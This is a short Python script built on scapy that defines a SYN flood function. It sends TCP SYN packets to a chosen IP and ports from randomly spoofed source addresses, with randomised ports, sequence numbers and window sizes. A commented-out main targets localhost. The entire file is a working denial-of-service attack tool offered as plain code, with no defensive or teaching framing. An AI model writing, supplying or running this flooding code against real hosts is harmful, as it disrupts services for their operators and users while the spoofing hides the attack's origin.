import random
# Requires scapy and npcap
from scapy.all import IP, TCP, send

def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(1000,9000)
	return x

def SYN_Flood(targetIP, numPackets, ports=None):
    if ports == None:
        ports = [range(3, 65535)]
    
    # Loop over number of packets to send to each port
    for i in range(numPackets):
        # Generate spoofed TCP packet values
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()
        
        # Loop over each specified port
        for port in ports:
            # Generate spoofed IP values
            IP_Packet = IP()
            IP_Packet.src = randomIP()
            IP_Packet.dst = targetIP

            TCP_Packet = TCP()	
            TCP_Packet.sport = s_port
            TCP_Packet.dport = port
            TCP_Packet.flags = "S"
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            # Send spoofed TCP SYN packet
            send(IP_Packet/TCP_Packet, verbose=0)
            print(f"Sent packet to {targetIP}:{port}")

"""
def main():
    SYN_Flood('127.0.0.1', 3, [123, 456])

if __name__ == "__main__":
    main()
"""